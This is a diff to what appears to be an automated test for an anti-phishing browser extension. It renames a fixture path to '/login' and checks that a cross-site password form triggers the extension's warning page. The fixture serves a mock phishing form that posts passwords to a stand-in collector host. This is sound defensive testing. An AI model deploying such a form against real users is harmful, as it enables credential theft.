@@ -54,7 +54,7 @@ const backend = createServer(async (req, res) => {
 
 const pages = createServer((req, res) => {
   res.setHeader("Content-Type", "text/html");
-  if (req.url === "/b") {
+  if (req.url === "/login") {
     res.end('<form action="http://collector.test:8123/p" method="post"><input type="password" name="p"></form>');
   } else {
     res.end(`<html><body><h1 id="ok">page ${req.url}</h1></body></html>`);
@@ -109,7 +109,7 @@ try {
   console.log("ok  suspicious page shows the banner", real ? "(real backend)" : `; backend got ${JSON.stringify(scoreCalls.at(-1))}`);
 
   // 3. page check: password form to another site escalates to the warning page
-  page = await open("http://evil-blocked.com:8123/b");
+  page = await open("http://evil-blocked.com:8123/login");
   await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "warning page");
   assert.match(await page.locator("#reasons").innerText(), /different website/);
   console.log("ok  cross-site password form escalates to the warning page");
